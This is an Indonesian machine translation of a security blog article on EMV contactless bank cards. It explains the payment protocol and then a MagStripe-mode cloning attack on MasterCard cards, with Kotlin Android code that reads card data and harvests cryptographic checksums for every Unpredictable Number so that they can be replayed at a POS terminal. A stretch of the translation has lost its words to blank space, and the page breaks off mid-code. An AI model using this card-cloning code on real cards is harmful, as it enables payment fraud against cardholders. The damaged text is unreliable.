<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🕺 💪🏾 🌵 Kloning kartu tanpa kontak menggunakan aplikasi seluler 🚴🏼 🥌 📜</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Itu selalu menarik untuk melihat apa yang terjadi pada kartu bank di bawah "kap". Bagaimana protokol komunikasi kartu bank dan terminal POS diimplemen...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Kloning kartu tanpa kontak menggunakan aplikasi seluler</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/421543/">  Itu selalu menarik untuk melihat apa yang terjadi pada kartu bank di bawah "kap".  Bagaimana protokol komunikasi kartu bank dan terminal POS diimplementasikan, cara kerjanya, dan seberapa amannya.  Kesempatan seperti itu muncul di depan saya ketika saya sedang magang di Digital Security.  Akibatnya, ketika menguraikan salah satu kerentanan kartu EMV yang diketahui dalam mode MagStripe, diputuskan untuk mengimplementasikan aplikasi seluler yang dapat berkomunikasi dengan terminal melalui antarmuka tanpa kontak, menggunakan perintahnya sendiri dan analisis rinci tentang permintaan dan tanggapan.  Dan juga mencoba menerapkan metode kloning kartu MasterCard dalam mode MagStripe. <br><br>  Pada artikel ini saya akan mencoba menjelaskan apa itu kartu EMV, bagaimana cara kerjanya dan bagaimana menggunakan Android Anda dapat mencoba mengkloning kartu MasterCard Anda. <br><br>  <i><b>"Ada beberapa hal yang tidak bisa dibeli dengan uang.</b></i>  <i><b>Untuk yang lainnya, ada MasterCard »</b></i> <br><br><h3>  Apa itu kartu EMV? </h3><br>  EMV adalah standar internasional untuk kartu bank dengan chip.  <b>E</b> uropay + <b>M</b> asterCard + <b>V</b> ISA ikut serta dalam pengembangan standar ini, karenanya namanya.  Mari kita coba mencari tahu bagaimana kartu berkomunikasi dengan terminal POS melalui antarmuka tanpa kontak. <br><a name="habracut"></a><br>  Mari kita mulai dengan dasar-dasarnya. <br><br>  Kartu EMV tanpa kontak fisik berfungsi hampir sama dengan tag RFID.  Jika dasar, chip memasuki medan elektromagnetik, dan dalam sirkuit konduksi tertutup (dalam kasus kami, itu akan menjadi antena yang terletak di sekeliling perimeter), ditempatkan di medan magnet bolak-balik, arus listrik bolak-balik dihasilkan.  Arus ini mengisi kapasitor khusus yang terhubung secara paralel dengan sirkuit resonan kartu.  Energi yang tersimpan dalam kapasitor digunakan untuk melakukan kartu sirkuit mikro untuk berbagai operasi.  Ketika pembaca mengubah bidang elektromagnetik, perubahan akan segera terlihat pada chip.  Dengan menggunakan modulasi sinyal, kita dapat mengirimkan informasi dalam bentuk biner.  Jika Anda menghubungkan resistansi beban pada kartu dan atau mengubah kapasitansi kapasitor, Anda dapat mengubah kekuatan arus dalam sirkuit kartu, yang akan menyebabkan perubahan dalam bidang elektromagnetik yang dibuat olehnya di wilayah sirkuit pembaca, sehingga kartu mentransmisikan data.  Pembaca harus mendeteksi perubahan ini.  Interaksi fisik ini diatur oleh standar ISO / IEC 14443 <i>"Kartu Identifikasi - kartu sirkuit terpadu tanpa kontak - Kartu kedekatan"</i> . <br><br>  Chip kartu itu sendiri adalah kartu pintar yang menjalankan JavaCard, versi terpisah Java untuk platform dengan sumber daya komputasi rendah dan dukungan untuk algoritma kriptografi.  JavaCard mengunduh applet, yang merupakan aplikasi.  Ada juga GlobalPlatform adalah standar tertentu untuk JavaCard, yang menyediakan kemampuan untuk mengelola data pada peta dengan aman dan memungkinkan Anda untuk mengunduh, memodifikasi, dan menghapus aplikasi pada peta.  Dalam artikel ini, kami tidak akan mempertimbangkan mekanisme keamanan kartu pintar itu sendiri.  Cukup mengetahui bahwa data yang dilindungi, misalnya, kunci pribadi dan kunci master rahasia kartu, berada di tempat yang aman dan tidak mungkin untuk menghapusnya menggunakan cara standar. <br><br>  Saya juga mengingatkan Anda tentang terminologi kecil untuk mereka yang tidak terbiasa. <br><br>  <b>Terminal POS</b> (Point of Sale) - perangkat penjual yang membaca kartu dan melakukan pembayaran.  Selanjutnya kita akan menyebut perangkat ini hanya terminal. <br>  <b>Bank penerbit</b> adalah bank yang mengeluarkan kartu Anda. <br>  <b>Acquirer Bank</b> - bank yang menerbitkan terminal POS untuk penjual dan memproses pembayaran dari mereka. <br>  <b>Sistem pembayaran</b> adalah penghubung utama antara bank pengakuisisi dan bank penerbit, benar-benar semua pembayaran melalui itu, dan ia tahu bank mana yang harus mentransfer uang ke berapa banyak.  Ada banyak sistem pembayaran di dunia, selain <b>Visa</b> dan <b>MasterCard yang terkenal,</b> ada juga <b>American Express</b> , <b>China UnionPay</b> dan sistem pembayaran Rusia <b>MIR</b> . <br><br>  Nah, kartu dan pembaca dapat berkomunikasi.  Mereka saling mengirim perintah APDU lainnya dalam bentuk <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Tag-Length-Value</a> i.e.  nama tag ditransmisikan dalam heksadesimal, panjang dan nilainya sendiri.  Semua perintah dijelaskan tentu saja dalam <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">dokumentasi</a> dan terlihat seperti ini: <br><br><img src="https://habrastorage.org/webt/kn/ne/tj/knnetjhcx4h0rd7xijgzyv5goye.png" alt="gambar"><br><br>  Transaksi EMV standar terjadi dalam beberapa tahap, saya akan menjelaskan algoritma interaksi penuh dalam kasus antarmuka kontak, untuk antarmuka tanpa kontak, algoritma agak dipersingkat: <br><br><ul><li>  Pemilihan aplikasi; </li><li>  Inisialisasi pemrosesan aplikasi; </li><li>  Membaca data aplikasi </li><li>  Otentikasi offline </li><li>  Kendala pemrosesan; </li><li>  Cek pemegang kartu; </li><li>  Manajemen risiko di sisi terminal; </li><li>  Analisis tindakan terminal; </li><li>  Manajemen risiko di sisi kartu; </li><li>  Analisis tindakan kartu; </li><li>  Pemrosesan online; </li><li>  Selesainya operasi. </li></ul><br><img src="https://habrastorage.org/webt/0y/sc/rd/0yscrdsiso65ccn0arqjwxc4joe.png" alt="gambar"><br><br>  Kami mempertimbangkan secara singkat setiap operasi. <br><br>  Seleksi aplikasi.  Sering terjadi bahwa ada beberapa aplikasi pada satu kartu.  Misalnya, kartu bank dan tiket perjalanan.  Dan terminal entah bagaimana perlu mencari tahu di mana dan algoritma mana yang digunakan.  Yang disebut <b>Application Identifier (AID</b> ) digunakan untuk memilih aplikasi.  Untuk memahami hal ini, terminal mengirim perintah <b>SELECT</b> .  Misalnya, <b>AID</b> kartu Visa Classic akan terlihat seperti ini: <b>A0000000031010</b> .  Jika beberapa kode seperti itu datang sebagai respons dan terminal dapat bekerja dengan beberapa aplikasi, terminal akan menampilkan daftar dan menawarkan untuk memilih aplikasi yang kita butuhkan.  Jika terminal tidak mendukung salah satu kode aplikasi, maka operasi akan ditolak oleh terminal. <br><br>  Menginisialisasi pemrosesan aplikasi.  Di sini, lokasi geografis pertama kali diperiksa.  Misalnya, kartu Maestro Momentum hanya dapat digunakan untuk pembayaran di Rusia.  Tahap ini dilakukan untuk memberikan kesempatan kepada emiten untuk menerapkan metode manajemen risiko online yang ada saat melakukan operasi offline.  Pada tahap ini, transaksi EMV dapat dibatalkan atas inisiatif kartu itu sendiri jika jenis transaksi ini dilarang oleh penerbit di negara tertentu di dunia.  Lebih lanjut, kartu mentransmisikan ke terminal satu set informasi terstruktur khusus yang berisi deskripsi fungsi kartu dan aplikasi. <br><br>  Baca data aplikasi.  Berbagai data kartu yang diperlukan untuk transaksi dikirimkan ke terminal, misalnya, nomor kartu, tanggal kedaluwarsa, penghitung transaksi, dan banyak data lainnya.  Beberapa dari mereka akan dibahas nanti. <br><br>  Data sampel: <br><br><img src="https://habrastorage.org/webt/qq/af/8u/qqaf8ualsk94r5lgoqqz9gupznc.png" alt="gambar"><br><br>  Sertifikat kunci publik dari bank penerbit dan kartu itu sendiri juga dikirimkan.  Agar terminal dapat memverifikasi tanda tangan digital dari beberapa data kartu, <b>infrastruktur PKI</b> (Infrastruktur Kunci Publik) digunakan.  Singkatnya, sistem pembayaran memiliki sepasang kunci - publik dan pribadi, dan sistem pembayaran untuk semua peserta <b>CA (Otoritas Pusat)</b> .  Bahkan, sistem pembayaran untuk setiap bank penerbit mengeluarkan pasangan kunci baru, dan pada saat yang sama menghasilkan sertifikat kunci publik dari bank penerbit, menandatanganinya dengan CA kunci pribadi.  Lebih lanjut, ketika bank mengeluarkan kartu baru, kartu tersebut membuat sepasang kunci untuk kartu tersebut, dan juga menghasilkan sertifikat kunci publik dari kartu tersebut, menandatanganinya menggunakan kunci pribadi bank.  Di terminal, sertifikat kunci publik biasanya ditransfer ke berbagai sistem pembayaran.  Dengan demikian, ketika kartu mentransmisikan sertifikat kunci publik bank penerbit dan sertifikat kartu itu sendiri, terminal dapat dengan mudah memeriksa seluruh rantai menggunakan kunci publik dari sistem pembayaran.  Terminal, menggunakan kunci publik dari sistem pembayaran, pertama memverifikasi keaslian sertifikat bank penerbit, jika itu asli, maka dapat dipercaya dan sekarang menggunakan sertifikat bank penerbit Anda dapat memverifikasi sertifikat kartu itu sendiri.  Lebih detail dalam artikel <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">tentang keamanan EMV</a> . <br><br>  Otentikasi offline.  Terminal menentukan jenis metode otentikasi offline yang didukung.  Ada yang statis ( <b>Otentikasi Data Statis - SDA</b> ), dinamis ( <b>Dynamic Data Authentication - DDA</b> ) dan gabungan ( <b>Combined Data Authentication - CDA</b> ).  Metode-metode ini juga didasarkan pada PKI.  <b>SDA</b> hanya menandatangani data pada kunci pribadi bank penerbit, <b>DDA</b> - terminal mengirimkan beberapa nomor acak dan kartu harus menandatanganinya menggunakan kunci privasinya, dan terminal akan memverifikasi tanda tangan ini menggunakan sertifikat kartu yang sebelumnya diterima, sehingga terminal akan memastikan bahwa kartu tersebut benar-benar memiliki kunci pribadi - karenanya asli.  <b>CDA</b> hanyalah kombinasi dari keduanya. <br><br>  Menangani batasan.  Di sini, terminal memeriksa data yang diterima sebelumnya dari kartu untuk kondisi kesesuaian operasi ini.  Misalnya, ia memeriksa tanggal mulai / akhir dari <b>Tanggal Kedaluwarsa Aplikasi</b> aplikasi <b>(Tag '5F24')</b> dan <b>Tanggal Efektif Aplikasi (Tag '5F25')</b> .  Ini juga memeriksa versi aplikasi.  Hasil operasi yang dilakukan pada tahap ini juga dicatat dalam laporan <b>TVR (hasil verifikasi Terminal)</b> .  Berdasarkan hasil tahap ini, transaksi tidak dapat dibatalkan, bahkan jika, misalnya, aplikasi telah kedaluwarsa. <br><br>  Cek pemegang kartu.  Verifikasi pemegang kartu dilakukan untuk mengotentikasi orang yang memberikan kartu dan memverifikasi apakah dia adalah pemilik sebenarnya dari kartu tersebut.  Standar EMV menyediakan berbagai <b>Metode Verifikasi Pemegang Kartu</b> .  Metode verifikasi didefinisikan baik di terminal maupun di peta.  Mereka terkandung dalam daftar yang disebut <b>CVM</b> .  Dalam proses eksekusi, terminal dan kartu membandingkan daftar CVM yang diterima dan memilih metode verifikasi umum. <br><br>  Daftar metode verifikasi yang didukung: <br><br><ul><li>  Tidak diperlukan CVM ('011111'b); </li><li>  Pemrosesan CVM gagal ('000000'b); </li><li>  Tanda tangan ('011110'b); </li><li>  PIN terenkripsi diverifikasi online ('000010'b); </li><li>  Verifikasi PIN Plaintext dilakukan oleh ICC ('000001'b); </li><li>  Verifikasi PIN plaintext dilakukan oleh ICC dan tanda tangan ('000011'b); </li><li>  Verifikasi PIN terenkripsi dilakukan oleh ICC ('000100'b); </li><li>  Verifikasi PIN terenkripsi dilakukan oleh ICC dan tanda tangan ('000101'b). </li></ul><br>  Di sini <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ada</a> juga informasi menarik tentang hal ini. <br><br>  Manajemen risiko di sisi terminal.  Pada tahap ini, terminal melakukan verifikasi internal parameter transaksi, berdasarkan pengaturan manajemen risiko bank yang mengakuisisi.  Prosedur manajemen risiko dapat dilakukan oleh terminal kapan saja antara selesainya proses pembacaan data kartu dan pembentukan perintah <b>GENERATE AC</b> pertama oleh terminal.  Manajemen risiko di sisi terminal mencakup tiga mekanisme: <br><br><ul><li>  kontrol ukuran operasi yang dilakukan pada kartu ( <b>Floor Limit Checking</b> ); </li><li>  pemilihan transaksi acak untuk otorisasi online dari transaksi ini oleh penerbit ( <b>Pemilihan Transaksi Acak</b> ); </li><li>  memeriksa aktivitas offline menggunakan kartu ( <b>Pengecekan Kecepatan</b> ). </li></ul><br>  Analisis tindakan terminal.  Pada tahap ini, terminal menganalisis hasil dari langkah-langkah transaksi sebelumnya.  Berdasarkan hasil analisis, terminal membuat keputusan apakah akan melakukan operasi online, memungkinkan untuk dilakukan secara offline atau menolak operasi. <br><br>  Manajemen risiko di sisi kartu.  Kartu, setelah menerima dari data perintah <b>GENERATE AC</b> tentang transaksi, terminal, dan hasil pemeriksaan terminal, pada gilirannya, melakukan prosedur manajemen risiko sendiri dan membuat keputusan sendiri tentang bagaimana menyelesaikan operasi. <br><br>  Analisis tindakan kartu.  Pada tahap ini, kartu menyelesaikan prosedur manajemen risiko dan menghasilkan kriptogram respons ke terminal.  Jika kartu memutuskan untuk menyetujui transaksi, maka <b>Sertifikat Transaksi</b> dihasilkan.  Jika kartu memutuskan untuk melakukan operasi secara real time, maka kartu tersebut menghasilkan <b>ARQC (Cryptogram Permintaan Otorisasi)</b> .  Jika kartu menggunakan metode otorisasi alternatif, maka <b>Referensi Otorisasi Aplikasi digunakan</b> .  Jika kartu menolak transaksi, maka <b>Cryptogram Otentikasi Aplikasi</b> . <br><br>  <b>Cryptogram ARPC (Authorization Response Cryptogram) lain</b> diperlukan untuk mengautentikasi penerbit.  Penerbit membuat cryptogram ARPC dan mengirimkan cryptogram ke kartu, jika kartu mengkonfirmasi cryptogram, maka penerbit diautentikasi oleh kartu. <br><br>  Sedikit tentang keamanan kunci dan otentikasi timbal balik dari kartu dan penerbit dari buku I. M. Goldovsky: <blockquote>  Arti dari saling otentikasi adalah bahwa kartu dan terminal saling mengautentikasi menggunakan otentikasi ARQC dan ARPC cryptogram.  Cryptograms adalah data yang dihasilkan menggunakan kunci rahasia (yang diketahui kartu dan bank kepada penerbit), nomor transaksi, nomor acak yang dihasilkan oleh terminal, serta beberapa detail transaksi, terminal dan kartu.  Dalam kasus ARPC, kode respons otorisasi penerbit juga ditambahkan ke data yang terdaftar.  Tanpa mengetahui kunci rahasia kartu untuk menghasilkan kriptogram, tidak mungkin untuk menghitung nilai ARQC / ARPC untuk waktu yang dapat diperkirakan dengan tingkat teknologi saat ini, dan oleh karena itu fakta keberhasilan verifikasi mereka menunjukkan keaslian kartu dan penerbit.  Otentikasi online adalah cara yang paling dapat diandalkan untuk mengotentikasi kartu.  Hal ini disebabkan fakta bahwa hal itu dilakukan langsung oleh penerbit, tanpa perantara dalam bentuk terminal.  Selain itu, algoritma 3DES dengan kunci sementara 112-bit digunakan untuk otentikasi online, kekuatan kriptografi yang sesuai dengan kekuatan kriptografi algoritma RSA dengan panjang modul kunci asimetris yang digunakan untuk otentikasi offline aplikasi kartu yang melebihi 1700 bit.  Menggunakan kunci asimetris yang panjang ini pada kartu masih cukup langka.  Biasanya kunci dengan panjang modul 1024, 1152 atau 1408 bit digunakan. </blockquote><br><br>  Pada akhirnya, transaksi online melewati rantai: <br>  <b>Kartu &lt;--&gt; POS-Terminal &lt;--&gt; Bank Memperoleh &lt;--&gt; Sistem Pembayaran &lt;--&gt; Penerbit Bank.</b> <br><br><img src="https://habrastorage.org/webt/lg/od/lo/lgodlo0oz2jbpxbje3o15q9ikgs.jpeg" alt="gambar"><br><br><h3>  Klon MasterCard dalam mode MagStripe </h3><br>  Kami melanjutkan langsung ke prinsip kloning.  Metode serangan kartu tanpa kontak ini diterbitkan oleh dua peneliti <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Michael Roland, Josef Langer</a> dari University of Austria.  Ini didasarkan pada prinsip umum yang disebut <i>Skimming</i> .  Ini adalah skenario di mana penyerang mencuri uang dari kartu bank dengan membaca (menyalin) informasi dari kartu ini.  Dalam kasus umum, penting untuk merahasiakan PIN dan tidak membocorkannya.  Tetapi dalam metode orang-orang Austria kita tidak perlu tahu ini.  Kloning kartu pembayaran berhasil untuk versi kernel dari aplikasi KV Contactless Kernel 2. Versi protokol ini mendukung dua mode operasi untuk kartu tanpa kontak: protokol EMV <b>(MasterCard PayPass M / Chip)</b> dan <b>mode MagStripe (MasterCard PayPass MagStripe)</b> . <br><br>  <b>MagStripe</b> adalah mode dukungan kartu strip magnetik.  Mode ini diterapkan pada kartu MasterCard dengan antarmuka tanpa kontak.  Mode MagStripe kemungkinan besar diperlukan untuk bank yang merasa kesulitan untuk mentransfer seluruh infrastruktur untuk mendukung transaksi EMV tanpa kontak chip.  Omong-omong, kartu Visa juga memiliki mode operasi yang serupa - <b>PayWave MSD (Magnetic Stripe Data)</b> . <br><br>  Proses pemrosesan transaksi untuk kartu tanpa kontak terpotong dibandingkan dengan kartu chip dan biasanya bekerja dalam mode berikut: <br><br><ol><li>  Terminal mengirimkan <b>perintah SELECT PPSE</b> (Proximity Payment System Environment).  Kartu mengirim daftar aplikasi yang didukung. </li><li>  Terminal mengirim perintah <b>SELECT</b> .  Sebagai tanggapan, ia menerima rincian aplikasi yang diperlukan. </li><li>  Terminal mengirimkan perintah <b>GET_PROCESSING_OPTIONS</b> .  Kartu menjawab jenis otentikasi yang didukungnya dan apakah verifikasi pemegang kartu ada di sana. </li><li>  Terminal mengirimkan perintah <b>READ_RECORDS</b> .  Kartu yang merespons mengirimkan Track1 dan Track2 hampir sama dengan yang terekam pada strip magnetik kartu. </li><li>  Terminal mengirimkan perintah <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .  Yang berarti bahwa kartu tersebut harus menghasilkan nilai CVC3 berdasarkan Nomor yang Tidak Dapat Diprediksi yang disahkan. </li></ol><br><img src="https://habrastorage.org/webt/yx/4k/go/yx4kgocqjxhraaeqz1c4qr4ukpe.jpeg" alt="gambar"><br><br><div class="spoiler">  <b class="spoiler_title">Bagaimana semuanya terlihat dalam kehidupan nyata?</b> <div class="spoiler_text">  Sepertinya tim <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">APDU</a> .  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Daftar semua tag</a> . <br><br>  APDU - Unit Data Protokol Aplikasi adalah simbol bingkai dengan perintah peta atau respons peta. <br><br>  Ada beberapa artikel tentang topik ini di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> dan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br></div></div><br>  Kartu ini mendukung perintah CHECKSUM CRYPTOGRAPHIC COMPUTE khusus, yang argumennya adalah data yang didefinisikan dalam Objek Data Angka yang Tidak Dapat Diprediksi (UDOL).  <b>Akibatnya, kartu menggunakan algoritma 3DES dan kunci rahasia menghitung nilai dinamis CVC3 (Kode Verifikasi Kartu).</b>  Sebagai argumen untuk fungsi 3DES, gabungan data UDOL dan penghitung transaksi (Application Transaction Counter, ATC) digunakan.  <b>Dengan demikian, nilai CVC3 selalu tergantung pada objek UN dan ATC.</b> <br><br>  Dengan kata lain, perintah ini diperlukan agar kartu menghasilkan "tanda tangan" tertentu sehingga penerbit dapat memverifikasi kartu.  Namun, tanda tangan transaksi itu sendiri tidak ada dari tanda tangan ini.  Tanda tangan berisi nilai <b>ATC - 2 byte</b> , <b>CVC3 (Track1) - 2 byte</b> , <b>CVC3 (Track2) - 2 byte</b> , yang dihasilkan oleh kartu berdasarkan kunci rahasia, yang juga diketahui oleh bank penerbit dan penghitung transaksi (ATC).  Pada saat yang sama, untuk menghasilkan tanda tangan, terminal POS menginformasikan kartu <b>UN (Unpredictable Number)</b> - 4 byte, yang juga digunakan dalam pembuatan tanda tangan.  Unpredictable Number mencegah pembuatan kode autentikasi pada kartu asli untuk selanjutnya digunakan dalam transaksi penipuan.  Untuk serangan, PBB sangat mengganggu kami, karena tidak mungkin untuk menyebutkan 4 byte tanpa melampaui batas konter transaksi.  Namun, ada beberapa kelemahan dalam spesifikasi ini. <br><br>  Pertama, spesifikasi membatasi PBB pada pengkodean angka, yaitu <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Binary Decimal Code (BCD)</a> , yang pada dasarnya berarti bahwa jika kita melihat angka yang dikodekan dalam HEX, kita hanya akan melihat angka dari 0 hingga 9, semua nilai lain dianggap seakan dilarang.  Dengan demikian, jumlah UN berkurang dari 4.294.967.295 menjadi 99.999.999. <br><br>  Kedua, jumlah digit UN yang signifikan ditentukan oleh kartu.  Jadi, tergantung pada parameter khusus dalam lintasan, jumlah digit di PBB dapat dari 10 hingga 10.000, tergantung pada jenis kartu, dalam praktiknya, 1000 nilai paling sering ditemukan. <br><br>  <b>Dengan demikian, rencana serangan adalah sebagai berikut:</b> <br><br><ol><li>  Kami membaca kartu dan mengetahui jumlah digit signifikan dari UN, yang akan disediakan oleh terminal </li><li>  Kami memilah-milah semua UN, mendapatkan semua nilai yang mungkin dari fungsi <b>COMPUTE_CRYPTOGRAHIC_CHECKSUM</b> , menyimpannya di tabel terkait dengan pemetaan UN -&gt; Hasil </li><li>  Kami membawanya ke terminal POS, kami menemukan nomor yang diminta terminal POS. </li><li>  Kami memilih hasil yang diinginkan dari tabel dan menggantinya sebagai respons terhadap terminal. </li><li>  Transaksi pergi. </li><li>  KEUNTUNGAN.  Tetapi keberhasilan persetujuan transaksi tidak dijamin, karena bank penerbit dapat menolak transaksi semacam itu. </li></ol><br><img src="https://habrastorage.org/webt/5q/iw/uh/5qiwuhgbebcdx_0bdzdbrvwmcd0.jpeg" alt="gambar"><br><br>  Perlu juga dicatat bahwa penghitung transaksi (ATC) mencegah penggunaan kembali kode otentikasi yang digunakan sebelumnya, yang berarti bahwa jika kita menggunakan serangan ini, kita harus menyalin kartu lagi, karena penghitung transaksi sudah digunakan untuk mendapatkan informasi dan digunakan dalam tanda tangan, yang berarti bahwa jika kami memiliki penghitung transaksi 1000, dan setelah kami mengirim transaksi ke bank, bank tidak akan lagi menerima transaksi dengan penghitung di bawah &lt;1001.  ,    2 ,  ,       65   ,       . <br><br>           . ,  <b>COMPUTE_CRYPTOGRAPHIC_CHECKSUM</b> .    CVC3 ,       <b>SELECT</b> ,  <b>GET_PROCESSING_OPTIONS</b> ,    <b>COMPUTE_CRYPTOGRACHIC_CHECKSUM</b>     .       CVC3.         , <b> 1000   Google Galaxy Nexus S    .</b> <br><br>         <b>Terminal Simulator</b>  MasterCard.      NFC-    .      .        POS-           .         ,    . <br><br><img src="https://habrastorage.org/webt/if/cw/ka/ifcwkapz8euoz-fdb9hnmbedigq.png" alt="gambar"><br><br>     NFC  <b>ACR122</b> . <br><br><img src="https://habrastorage.org/webt/kx/75/q8/kx75q8xlkxsg3q3hodn9h1yze2o.jpeg" alt="gambar"><br><br>        .      Kotlin  Android.      . <br><br><pre><code class="plaintext hljs">data class Command( var CLA: String = 0x00.toString(), var INS: String = 0x00.toString(), var P1: String = "", var P2: String = "", var Lc: String = "", var Nc: String = "", var Le: String = "", var Nr: String = "", var SW1WS2: String = "" ) { fun split(): ByteArray { return getHexString().hexToByteArray() } fun getHexString() = CLA.plus(INS).plus(P1).plus(P2).plus(Lc).plus(Nc).plus(Le).plus(Nr).plus(SW1WS2) }</code> </pre> <br>  Pertama, kita perlu mengatur kerja dengan NFC.  Di telepon kita dapat bekerja dalam dua mode.  Dalam mode kartu, ini adalah ketika kita merespons perintah dari terminal, dan dalam mode terminal ketika kita mengirim perintah dan membaca, misalnya, kartu.  Yaitu  pertama, kita dapat mengkloning kartu, dan kemudian memastikan bahwa kita menanggapi permintaan dari terminal dengan perintah yang sudah disiapkan. <br><br>  Berikut ini adalah implementasi interaksi yang disederhanakan dengan NFC: <br><br><pre> <code class="plaintext hljs"> private var nfcAdapter: NfcAdapter? = null /*!&lt; represents the local NFC adapter */ private var tag: Tag? = null /*!&lt; represents an NFC tag that has been discovered */ private lateinit var tagcomm: IsoDep /*!&lt; provides access to ISO-DEP (ISO 14443-4) */ private val nfctechfilter = arrayOf(arrayOf(NfcA::class.java.name)) /*!&lt; NFC tech lists */ private var nfcintent: PendingIntent? = null .... override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) setContentView(R.layout.activity_main) nfcAdapter = NfcAdapter.getDefaultAdapter(this) nfcintent = PendingIntent.getActivity(this, 0, Intent(this, javaClass).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0) cardEmulation = CardEmulation.getInstance(nfcAdapter) nfcAdapter?.enableForegroundDispatch(this, nfcintent, null, nfctechfilter) } .... override fun onNewIntent(intent: Intent) { super.onNewIntent(intent) tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG) cardReading(tag) } ..... override fun onResume() { super.onResume() if (canSetPreferredCardEmulationService()) { this.cardEmulation?.setPreferredService(this, ComponentName(this, "com.nooan.cardpaypasspass.NfcService")); } } override fun onPause() { if (canSetPreferredCardEmulationService()) { this.cardEmulation?.unsetPreferredService(this) } super.onPause() } private fun cardReading(tag: Tag?) { tagcomm = IsoDep.get(tag) try { tagcomm.connect() } catch (e: IOException) { error = "Reading card data ... Error tagcomm: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } try { when { commands != null -&gt; readCardWithOurCommands() mChip -&gt; readCardMChip() else -&gt; readCardMagStripe() } } catch (e: IOException) { error = "Reading card data ... Error tranceive: " + e.message Toast.makeText(applicationContext, error, Toast.LENGTH_SHORT).show() return } finally { tagcomm.close() } } protected fun execute(command: Command, log:Boolean): ByteArray { val bytes = command.split() listLogs.add(bytes.toHex()) val recv = tagcomm.transceive(bytes) listLogs.add(recv.toHex()) return recv }</code> </pre><br>  Ini menjelaskan urutan perintah dan menghitung nilai-nilai dari Angka yang Tidak Dapat Diprediksi dalam satu siklus dari 0 hingga 999, kami mengubah Nc menjadi "00000 $ {String.format ("% 03d ", i)}". Ganti (".. (?! $ ) ". toRegex ()," $ 0 ").  Dan jangan lupa untuk mengeksekusi GET_PROCESSING_OPTIONS setiap kali sebelum COMPUTE_CRYPTOGRAPHIC_CHECKSUM jika tidak, jumlah cek tidak akan dihitung. <br><br>  Akibatnya, semua ini dapat ditulis ke file dan sudah digunakan saat bekerja dengan terminal ini.  Di sini kita mendapatkan Nama dan Nomor Kartu, kita dapat menampilkannya di layar. <br><br><pre> <code class="plaintext hljs"> private fun readCardMagStripe() { try { var response = execute(Commands.SELECT_PPSE) //       val select = Commands.SELECT_APPLICATION.apply { Nc = response.toHex().substring(52, 68) SW1WS2 = "00" } val cardtype: String = getTypeCard(select.split()) execute(select) execute(Commands.GET_PROCESSING_OPTIONS) response = execute(Commands.READ_RECORD_1.apply { P2 = "0C" Lc = "00" Le = "" Nc = "" }) if (cardtype === "MasterCard") { cardnumber = "Card number: ${response.getCards()}" cardexpiration = "Card expiration: ${response.getExpired()}" showData() for (i in 0..999) { execute(Commands.GET_PROCESSING_OPTIONS, false) execute(Commands.COMPUTE_CRYPTOGRAPHIC_CHECKSUM.apply { Lc = "04" Nc = "00000${String.format("%03d", i)}".replace("..(?!$)".toRegex(), "$0 ") }) } } finishRead() }</code> </pre><br>  Seperangkat perintah yang kita butuhkan. <br><br><pre> <code class="plaintext hljs">object Commands { val 